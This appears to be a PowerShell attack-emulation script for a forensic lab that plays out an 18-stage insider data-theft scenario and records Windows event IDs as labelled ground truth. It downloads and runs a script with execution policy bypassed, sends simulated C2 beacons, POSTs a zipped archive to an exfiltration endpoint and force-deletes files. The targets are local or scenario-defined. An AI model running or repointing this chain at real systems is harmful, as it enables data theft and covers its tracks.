param(
    [string]$ScenarioPath = ".\scenario1.json"
)

$principal = New-Object Security.Principal.WindowsPrincipal `
    ([Security.Principal.WindowsIdentity]::GetCurrent())

if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Run PowerShell as Administrator." -ForegroundColor Red
    exit
}

# 기존 리스너 정리 (재실행 시 포트 충돌 방지)
Get-Process python -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

$listener8080 = Start-Process python `
    -ArgumentList "-m http.server 8080 --bind 127.0.0.1 --directory `"C:\ELP\ForensicLab\scenario`"" `
    -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
$listener8888 = Start-Process python `
    -ArgumentList "-m http.server 8888 --bind 127.0.0.1" `
    -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
$listener4444 = Start-Process python `
    -ArgumentList "-m http.server 4444 --bind 127.0.0.1" `
    -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
$listener9090 = Start-Process python `
    -ArgumentList "C:\ELP\ForensicLab\scenario\server9090.py" `
    -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3
Write-Host "[INIT] HTTP listeners started (8080, 8888, 4444, 9090)" -ForegroundColor DarkGray

if (-not (Test-Path $ScenarioPath)) {
    Write-Error "Scenario file not found: $ScenarioPath"
    exit 1
}

$raw = Get-Content $ScenarioPath -Raw -Encoding UTF8
if ([string]::IsNullOrWhiteSpace($raw)) {
    Write-Error "Scenario file is empty: $ScenarioPath"
    exit 1
}

$Scenario  = $raw | ConvertFrom-Json
$Artifacts = $Scenario.artifacts_definition

$GTDir        = "C:\GT"
$Payload      = $Artifacts.payload_download_path
$ReconFile    = $Artifacts.recon_output_file
$CollectDir   = $Artifacts.target_collection_dir
$StageDir     = $Artifacts.staging_directory
$ZipPath      = $Artifacts.archive_temp_file
$FinalArchive = $Artifacts.archive_final_file
$EmailDraft   = $Artifacts.email_draft_file
$VhdPath      = $Artifacts.vhd_image_path
$VhdDir       = Split-Path $VhdPath -Parent
$SimC2Primary    = $Artifacts.sim_c2_primary
$SimC2Secondary  = $Artifacts.sim_c2_secondary
$SimExfil        = $Artifacts.sim_exfil_endpoint
$CleanupTargets  = $Artifacts.cleanup_targets
$CleanupSurvivors = $Artifacts.cleanup_survivors

Write-Host "[INIT] Scenario loaded: $($Scenario.scenario_name)" -ForegroundColor Cyan

$requiredDirs = @(
    $GTDir,
    $StageDir,
    $VhdDir,
    (Split-Path $Payload      -Parent),
    (Split-Path $ReconFile    -Parent),
    (Split-Path $ZipPath      -Parent),
    (Split-Path $EmailDraft   -Parent)
)
foreach ($d in $requiredDirs) {
    if (-not [string]::IsNullOrWhiteSpace($d) -and -not (Test-Path $d)) {
        New-Item $d -ItemType Directory -Force | Out-Null
        Write-Host "[INIT] Created: $d" -ForegroundColor DarkGray
    }
}

# SACL 설정 (4663/4656 이벤트 수집용)
$saclPaths = @(
    "C:\Users\jso45\Downloads",
    "C:\Users\jso45\Documents",
    "C:\ProgramData\WinSvc",
    "C:\PerfLogs",
    "C:\Users\Public\Libraries"
)
foreach ($sp in $saclPaths) {
    if (-not (Test-Path $sp)) { New-Item $sp -ItemType Directory -Force | Out-Null }
    try {
        $acl = Get-Acl -Path $sp -Audit
        $rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone",
            "ReadData,WriteData,Delete,AppendData",
            "ContainerInherit,ObjectInherit",
            "None",
            "Success"
        )
        $acl.AddAuditRule($rule)
        Set-Acl -Path $sp -AclObject $acl
        Write-Host "[INIT] SACL set: $sp" -ForegroundColor DarkGray
    } catch {
        Write-Host "[INIT] SACL failed: $sp - $_" -ForegroundColor Yellow
    }
}

if (Test-Path $CollectDir) {
    $dummyCount = (Get-ChildItem $CollectDir -File -ErrorAction SilentlyContinue).Count
    if ($dummyCount -eq 0) {
        foreach ($ext in $Artifacts.collection_extensions) {
            $ext = $ext.TrimStart(".")
            "dummy content $ext" | Out-File "$CollectDir\sample.$ext" -Encoding UTF8 -Force
        }
        Write-Host "[INIT] Dummy files created in $CollectDir" -ForegroundColor DarkGray
    }
}

$GTPath    = "$GTDir\ground_truth.json"
$Global:GT = @{
    schema_version = "2.0"
    scenario_id    = $Scenario.scenario_id
    scenario_name  = $Scenario.scenario_name
    user           = $env:USERNAME
    host           = $env:COMPUTERNAME
    generated_at   = (Get-Date).ToString("o")
    records        = @()
}

$AllowedSecurityIDs = $Scenario.environment_context.required_logging_configuration.security_events
$AllowedSysmonIDs   = $Scenario.environment_context.required_logging_configuration.sysmon_events


function Collect-ObservedEvents {
    param($StartTime, $EndTime)
    $securityIds   = @()
    $sysmonIds     = @()

    try {
        $sec = Get-WinEvent -FilterHashtable @{
            LogName   = 'Security'
            StartTime = $StartTime
            EndTime   = $EndTime
        } -ErrorAction SilentlyContinue | Where-Object { $_.Id -in $AllowedSecurityIDs }
        if ($sec) { $securityIds = @($sec | Select-Object -ExpandProperty Id -Unique) }
    } catch {}

    try {
        $sys = Get-WinEvent -FilterHashtable @{
            LogName   = 'Microsoft-Windows-Sysmon/Operational'
            StartTime = $StartTime
            EndTime   = $EndTime
        } -ErrorAction SilentlyContinue | Where-Object { $_.Id -in $AllowedSysmonIDs }
        if ($sys) { $sysmonIds = @($sys | Select-Object -ExpandProperty Id -Unique) }
    } catch {}

    return [ordered]@{
        sysmon     = @($sysmonIds)
        security   = @($securityIds)
    }
}


$Global:StageSummary = @()

# Invoke-Stage: Action=전체실행(노이즈+공격), AttackAction=GT수집용 공격행위만
function Invoke-Stage {
    param(
        $StageId,
        $StageName,
        $ActionType,
        $ArtifactPaths,
        $PrimarySignal,
        [bool]$AttackStage = $true,
        [ScriptBlock]$Action,
        [ScriptBlock]$AttackAction = $null   # GT 수집용 공격 행위만 (없으면 Action 전체 기준)
    )
    Write-Host ""
    Write-Host "===== Stage $StageId : $StageName =====" -ForegroundColor Cyan

    $stageMeta = $Scenario.scenario_flow | Where-Object { $_.stage_id -eq $StageId }
    $resolvedDesc = if ($stageMeta -and $stageMeta.description) { $stageMeta.description } else { "" }
    if ($resolvedDesc) {
        Write-Host "  $resolvedDesc" -ForegroundColor DarkGray    
    }
    $resolvedActionType = if ($stageMeta -and $stageMeta.action_type) { $stageMeta.action_type } else { $ActionType }

    $status = "success"

    # AttackAction이 있으면: 노이즈 먼저 실행 후 공격 구간만 타이머 측정
    # AttackAction이 없으면: 기존 방식 (Action 전체 타이머)
    if ($AttackAction) {
        # 전체 Action 실행 (노이즈 포함) - 로그에는 다 남음
        try { & $Action } catch {
            $status = "failed"
            Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
        }

        # 공격 행위만 별도로 타이머 측정하여 GT 수집
        $start = Get-Date
        try {
            & $AttackAction
            $missing = @()
            foreach ($p in $ArtifactPaths) {
                if ($p -and -not (Test-Path $p)) { $missing += $p }
            }
            if ($missing.Count -gt 0) {
                $status = "partial"
                Write-Host "  [PARTIAL] artifact missing: $($missing -join ', ')" -ForegroundColor Yellow
            } else {
                Write-Host "  [OK] Stage $StageId completed." -ForegroundColor Green
            }
        } catch {
            $status = "failed"
            Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
        }
        $end = Get-Date
    } else {
        # 기존 방식
        $start = Get-Date
        try {
            & $Action
            $missing = @()
            foreach ($p in $ArtifactPaths) {
                if ($p -and -not (Test-Path $p)) { $missing += $p }
            }
            if ($missing.Count -gt 0) {
                $status = "partial"
                Write-Host "  [PARTIAL] artifact missing: $($missing -join ', ')" -ForegroundColor Yellow
            } else {
                Write-Host "  [OK] Stage $StageId completed." -ForegroundColor Green
            }
        } catch {
            $status = "failed"
            Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
        }
        $end = Get-Date
    }

    # AttackStart/End가 설정됐으면 공격 구간만 기준으로 수집
    if ($script:AttackStart -and $script:AttackEnd) {
        $StartTime = $script:AttackStart.AddSeconds(-2)
        $EndTime   = $script:AttackEnd.AddSeconds(80)
        $script:AttackStart = $null
        $script:AttackEnd   = $null
    } else {
        $StartTime = $start.AddSeconds(-5)
        $EndTime   = $end.AddSeconds(80)
    }

    $observed = Collect-ObservedEvents $StartTime $EndTime
   

    if ($stageMeta -and $stageMeta.expected_logs) {
        $expectedSec = @()
        $expectedSys = @()
        if ($stageMeta.expected_logs.security) {
            $expectedSec = @($stageMeta.expected_logs.security)
        }
        if ($stageMeta.expected_logs.sysmon) {
            $expectedSys = @($stageMeta.expected_logs.sysmon)
        }

        $observed.sysmon   = @($observed.sysmon   | Where-Object { $_ -in $expectedSys } | Sort-Object -Unique)
        $observed.security = @($observed.security | Where-Object { $_ -in $expectedSec } | Sort-Object -Unique)
    }

    $Global:GT.records += [ordered]@{
        stage_id             = $StageId
        stage_name           = $StageName
        action_type          = $resolvedActionType
        description          = $resolvedDesc
        attack               = $AttackStage
        stage_start_time     = $start.ToString("o")
        stage_end_time       = $end.ToString("o")
        artifact_paths       = $ArtifactPaths
        user                 = $env:USERNAME
        host                 = $env:COMPUTERNAME
        execution_status     = $status
        observed_event_ids   = $observed
        expected_event_ids   = if ($stageMeta) { $stageMeta.expected_logs } else { $null }
        primary_log_signal   = $PrimarySignal
        notes                = if ($stageMeta) { $stageMeta.notes } else { "" }
    }
    $Global:StageSummary += [PSCustomObject]@{
        ID     = $StageId
        Name   = $StageName
        Status = $status
    }
    Start-Sleep -Seconds 3
}

function Show-Summary {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor White
    Write-Host "  STAGE SUMMARY" -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
    foreach ($s in $Global:StageSummary) {
        $icon = switch ($s.Status) {
            "success" { "[OK    ]" }
            "partial" { "[PART  ]" }
            "failed"  { "[FAILED]" }
            default   { "[?     ]" }
        }
        $color = switch ($s.Status) {
            "success" { "Green"  }
            "partial" { "Yellow" }
            "failed"  { "Red"    }
            default   { "Gray"   }
        }
        Write-Host ("  {0} Stage {1,2} : {2}" -f $icon, $s.ID, $s.Name) -ForegroundColor $color
    }
    $total   = $Global:StageSummary.Count
    $ok      = ($Global:StageSummary | Where-Object Status -eq "success").Count
    $partial = ($Global:StageSummary | Where-Object Status -eq "partial").Count
    $failed  = ($Global:StageSummary | Where-Object Status -eq "failed").Count
    Write-Host "--------------------------------------------" -ForegroundColor White
    Write-Host ("  Total:{0}  OK:{1}  Partial:{2}  Failed:{3}" `
        -f $total, $ok, $partial, $failed) -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
}

Write-Host ""
Write-Host "=== Scenario Start: $($Scenario.scenario_name) ===" -ForegroundColor White

# ===== Stage 1: authorized_logon =====
Invoke-Stage 1 "authorized_logon" "user_logon" @() "Logon Event" $false {
    Start-Sleep -Seconds 5
}

# ===== Stage 2: suspicious_url_access =====
Invoke-Stage 2 "suspicious_url_access" "browser_url_access" @() "Network Connection from Browser" $true {

    # 공격 구간 초기화
    $script:AttackStart = $null
    $script:AttackEnd   = $null

    # =========================
    # 공격
    # =========================
    $script:AttackStart = Get-Date

    $proc = Start-Process msedge $Artifacts.sim_payload_url -PassThru
    Start-Sleep -Seconds 2   # 네트워크 이벤트 안정화

    $script:AttackEnd = Get-Date
    # 정리
    Stop-Process -Name msedge -ErrorAction SilentlyContinue
}


# ===== Stage 3: script_download =====
Invoke-Stage 3 "script_download" "file_download" @($Payload) "File Create in Downloads" $true {
    $script:AttackStart = Get-Date
    Start-Process powershell -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri '$($Artifacts.sim_payload_url)' -OutFile '$Payload' -UseBasicParsing`"" `
        -Wait -NoNewWindow
    $script:AttackEnd = Get-Date
    Start-Sleep -Seconds 3
}

# ===== Stage 4: powershell_execution =====
Invoke-Stage 4 "powershell_execution" "script_execution" @($Payload) "Process Create: powershell.exe" $true {

    $script:AttackStart = $null
    $script:AttackEnd   = $null


    # =========================
    # 공격 실행
    # =========================
    $script:AttackStart = Get-Date

    Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$Payload`"" `
        -WindowStyle Hidden -Wait

    $script:AttackEnd = Get-Date

}


# ===== Stage 5: network_discovery_ipconfig =====
Invoke-Stage 5 "network_discovery_ipconfig" "system_reconnaissance" @($ReconFile) "Process Create: ipconfig" $true {
    
    ipconfig /all | Out-File $ReconFile -Encoding UTF8 -Force
    systeminfo    | Out-File $ReconFile -Encoding UTF8 -Append

    Start-Sleep -Seconds 5
}


# ===== Stage 6: documents_enumeration =====
Invoke-Stage 6 "documents_enumeration" "file_and_directory_discovery" @() "Object Access: Documents" $true {

    $script:AttackStart = $null
    $script:AttackEnd   = $null

    # =========================
    # 공격 (CollectDir 탐색)
    # =========================
    $script:AttackStart = Get-Date

    Get-ChildItem $CollectDir -Recurse -File `
        -ErrorAction SilentlyContinue | Select-Object -First 10 | Out-Null

    Start-Sleep -Seconds 2
    $script:AttackEnd = Get-Date

    Start-Sleep -Seconds 2
}


# ===== Stage 7: initial_file_staging =====
Invoke-Stage 7 "initial_file_staging" "file_staging" @($StageDir) "File Create in Staging Dir" $true {

    $script:AttackStart = $null
    $script:AttackEnd   = $null


    # =========================
    # 공격 (CollectDir → StageDir)
    # =========================
    $script:AttackStart = Get-Date

    New-Item -ItemType Directory -Path $StageDir -Force | Out-Null

    Get-ChildItem $CollectDir -File -ErrorAction SilentlyContinue |
        Select-Object -First 3 |
        ForEach-Object {
            Copy-Item $_.FullName -Destination $StageDir -Force
        }

    Start-Sleep -Seconds 2
    $script:AttackEnd = Get-Date
    Start-Sleep -Seconds 2
}


# ===== Stage 8 =====
Invoke-Stage 8 "c2_attempt_primary" "c2_beacon_attempt" @() "Network Connection: C2 Primary" $true {
    $script:AttackStart = Get-Date
    Start-Process powershell -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -Command `"try { Invoke-WebRequest -Uri '$SimC2Primary' -UseBasicParsing -TimeoutSec 5 } catch {}`"" `
        -Wait -NoNewWindow
    Start-Sleep -Seconds 5
    $script:AttackEnd = Get-Date
}

# ===== Stage 9 =====
Invoke-Stage 9 "c2_attempt_retry" "c2_fallback_beacon" @() "Network Connection: C2 Secondary" $true {
    $script:AttackStart = Get-Date
    Start-Process powershell -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -Command `"try { Invoke-WebRequest -Uri '$SimC2Secondary' -UseBasicParsing -TimeoutSec 5 } catch {}`"" `
        -Wait -NoNewWindow
    Start-Sleep -Seconds 5
    $script:AttackEnd = Get-Date
}

# ===== Stage 10: archive_attempt_failure =====
# 노이즈(정상 압축)는 Action에서 먼저 실행, GT는 AttackAction(실패 압축)만 기준
Invoke-Stage 10 "archive_attempt_failure" "archive_creation_fail" @() "Compress Attempt" $true {

    $script:AttackStart = $null
    $script:AttackEnd   = $null

    # =========================
    # 공격 (실패 유도)
    # =========================
    $script:AttackStart = Get-Date

    $cmdAttack = "Compress-Archive -Path `"$StageDir\*`" -DestinationPath `"$env:TEMP\fail.zip`" -ErrorAction Stop"

    Start-Process powershell `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $cmdAttack" `
        -WindowStyle Hidden -Wait

    Start-Sleep -Seconds 2
    $script:AttackEnd = Get-Date


    Start-Sleep -Seconds 2
}



# ===== Stage 11: archive_retry_success =====
Invoke-Stage 11 "archive_retry_success" "archive_creation_success" @($ZipPath) "Archive Creation" $true {
    $script:AttackStart = $null
    $script:AttackEnd   = $null


    # 공격
    if (Test-Path $StageDir) {
        $script:AttackStart = Get-Date

        $tempZip = "$env:TEMP\data001.zip"
        $zipParent = Split-Path $ZipPath -Parent
        if (-not (Test-Path $zipParent)) {
            New-Item $zipParent -ItemType Directory -Force | Out-Null
        }

        
        Start-Process powershell -ArgumentList `
            "-NoProfile -ExecutionPolicy Bypass -Command `"Compress-Archive -Path '$StageDir\*' -DestinationPath '$tempZip' -Force`"" `
            -Wait -NoNewWindow

        Move-Item $tempZip $ZipPath -Force
        Start-Sleep -Seconds 5
        $script:AttackEnd = Get-Date
    }
}


# ===== Stage 12: archive_rename =====
Invoke-Stage 12 "archive_rename" "file_masquerading" @($FinalArchive) "File Rename: .zip to .dat" $true {
    $script:AttackStart = $null
    $script:AttackEnd   = $null

    if (Test-Path $ZipPath) {
        $script:AttackStart = Get-Date
        Copy-Item $ZipPath $FinalArchive -Force
        Remove-Item $ZipPath -Force
        Start-Sleep -Seconds 2
        $script:AttackEnd = Get-Date
    }
    Start-Sleep -Seconds 2
}

# ===== Stage 13: email_artifact_creation =====
Invoke-Stage 13 "email_artifact_creation" "email_draft_preparation" @($EmailDraft) "File Create: .eml" $true {

    $script:AttackStart = $null
    $script:AttackEnd   = $null


    # =========================
    # 공격 (.eml 생성)
    # =========================
    $script:AttackStart = Get-Date

    $eml  = "From: insider@corp.local`r`n"
    $eml += "To: external@drop-example.com`r`n"
    $eml += "Subject: Q3 cache update`r`n"
    $eml += "Attachment: $FinalArchive`r`n"

    if (Test-Path $EmailDraft) {
        Remove-Item $EmailDraft -Force -ErrorAction SilentlyContinue
    }

    $eml | Out-File $EmailDraft -Encoding UTF8 -Force

    Start-Sleep -Seconds 2
    $script:AttackEnd = Get-Date

    Start-Sleep -Seconds 2
}

# ===== Stage 14: external_upload_attempt =====
Invoke-Stage 14 "external_upload_attempt" "data_exfiltration" @() "Network Activity" $true {
    $script:AttackStart = $null
    $script:AttackEnd   = $null

    # 공격: 자식 프로세스로 실행
    if (Test-Path $FinalArchive) {
        $exfilScript = "$env:TEMP\exfil_s14.ps1"
        @"
`$bytes = [System.IO.File]::ReadAllBytes('$FinalArchive')
try {
    Invoke-WebRequest '$SimExfil' -Method POST -Body `$bytes ``
        -ContentType 'application/octet-stream' -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop
} catch {}
"@ | Out-File $exfilScript -Encoding UTF8 -Force

        $script:AttackStart = Get-Date
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$exfilScript`"" `
            -Wait -NoNewWindow
        Start-Sleep -Seconds 2
        $script:AttackEnd = Get-Date
        Remove-Item $exfilScript -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "  [Stage14] FinalArchive not found" -ForegroundColor Yellow
    }
    Start-Sleep -Seconds 5
}


# ===== Stage 15: vhd_mount_simulated_usb =====
$Script:vhdMountDrive = $null
$Script:vhdTargetDir  = $null

Invoke-Stage 15 "vhd_mount_simulated_usb" "removable_media_simulation" @($VhdPath) "VHD Mount" $true {
    if (Test-Path $VhdPath) {
        Dismount-DiskImage -ImagePath $VhdPath -ErrorAction SilentlyContinue
        Remove-Item $VhdPath -Force -ErrorAction SilentlyContinue
    }
    New-VHD -Path $VhdPath -SizeBytes 200MB -Fixed -ErrorAction Stop | Out-Null
    $image = Mount-DiskImage -ImagePath $VhdPath -PassThru -ErrorAction Stop
    $diskNumber = ($image | Get-Disk).Number
    Initialize-Disk -Number $diskNumber -PartitionStyle MBR -Confirm:$false
    $part = New-Partition -DiskNumber $diskNumber -UseMaximumSize -AssignDriveLetter
    Format-Volume -DriveLetter $part.DriveLetter -FileSystem NTFS -Confirm:$false | Out-Null
    $Script:vhdMountDrive = "$($part.DriveLetter):"
    $Script:vhdTargetDir  = "$($Script:vhdMountDrive)\LeakStage"
    Start-Sleep -Seconds 2
    New-Item -Path $Script:vhdTargetDir -ItemType Directory -Force | Out-Null
    try {
        $vhdAuditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone",
            "WriteAttributes, Write, Delete",
            [System.Security.AccessControl.InheritanceFlags]"ContainerInherit, ObjectInherit",
            [System.Security.AccessControl.PropagationFlags]"None",
            [System.Security.AccessControl.AuditFlags]"Success"
        )
        $acl = Get-Acl -Path $Script:vhdMountDrive -Audit
        $acl.AddAuditRule($vhdAuditRule)
        Set-Acl -Path $Script:vhdMountDrive -AclObject $acl
        Write-Host "  [SACL] VHD drive applied: $($Script:vhdMountDrive)" -ForegroundColor DarkGray
    } catch {
        Write-Host "  [SACL] VHD SACL failed: $_" -ForegroundColor Yellow
    }

    $script:AttackStart = Get-Date
    Start-Process cmd.exe -ArgumentList "/c exit 0" -Wait -NoNewWindow
    $script:AttackEnd = Get-Date

    Start-Sleep -Seconds 3
}

# ===== Stage 16: bulk_copy_to_vhd =====
Invoke-Stage 16 "bulk_copy_to_vhd" "copy_bulk_data_to_removable_media" @($Script:vhdTargetDir) "File Create in VHD" $true {

    $script:AttackStart = $null
    $script:AttackEnd   = $null

    # =========================
    # 공격: StageDir → VHD 복사
    # =========================
    if ( (Test-Path $StageDir) -and (Test-Path $Script:vhdTargetDir) ) {

        $script:AttackStart = Get-Date

        Copy-Item "$StageDir\*" `
            -Destination $Script:vhdTargetDir `
            -Recurse `
            -ErrorAction SilentlyContinue

        Start-Sleep -Seconds 2
        $script:AttackEnd = Get-Date
    }

    Start-Sleep -Seconds 3
}
# ===== Stage 17 직전: cleanup 대상 파일 강제 생성 =====
Start-Sleep -Seconds 5
New-Item -ItemType Directory -Path $StageDir -Force | Out-Null
"tmp data" | Out-File "$StageDir\data001.tmp" -Force
"cache"    | Out-File $FinalArchive -Force
Start-Sleep -Seconds 3


# ===== Stage 17: partial_cleanup =====
Invoke-Stage 17 "partial_cleanup" "cleanup" @() "File Delete" $true {
    $files = @()
    $dirs  = @()
    foreach ($target in $CleanupTargets) {
        if (Test-Path $target -PathType Leaf)      { $files += $target }
        elseif (Test-Path $target -PathType Container) { $dirs += $target }
    }
    foreach ($file in $files) {
        Write-Host "Deleting file: $file"
        Start-Process cmd.exe -ArgumentList "/c del /f /q `"$file`"" -Wait -NoNewWindow
        Start-Sleep -Milliseconds 600
    }
    foreach ($dir in $dirs) {
        Write-Host "Deleting directory: $dir"
        Start-Process cmd.exe -ArgumentList "/c rmdir /s /q `"$dir`"" -Wait -NoNewWindow
        Start-Sleep -Milliseconds 600
    }
}


# ===== Stage 18: session_termination =====
Invoke-Stage 18 "session_termination" "process_exit" @() "Process Exit" $false {
    Write-Host "  Session End." -ForegroundColor DarkGray
    $script:AttackStart = Get-Date
    Start-Process cmd.exe -ArgumentList "/c exit 0" -Wait -NoNewWindow
    $script:AttackEnd = Get-Date
    Start-Sleep -Seconds 5
}

Stop-Process -Id $listener8080.Id -Force -ErrorAction SilentlyContinue
Stop-Process -Id $listener8888.Id -Force -ErrorAction SilentlyContinue
Stop-Process -Id $listener4444.Id -Force -ErrorAction SilentlyContinue
Stop-Process -Id $listener9090.Id -Force -ErrorAction SilentlyContinue
Write-Host "[CLEANUP] HTTP listeners stopped." -ForegroundColor DarkGray

$Global:GT.total_stages = $Global:GT.records.Count
$Global:GT | ConvertTo-Json -Depth 6 | Out-File $GTPath -Encoding UTF8

Show-Summary

Write-Host ""
Write-Host "GT saved: $GTPath" -ForegroundColor Yellow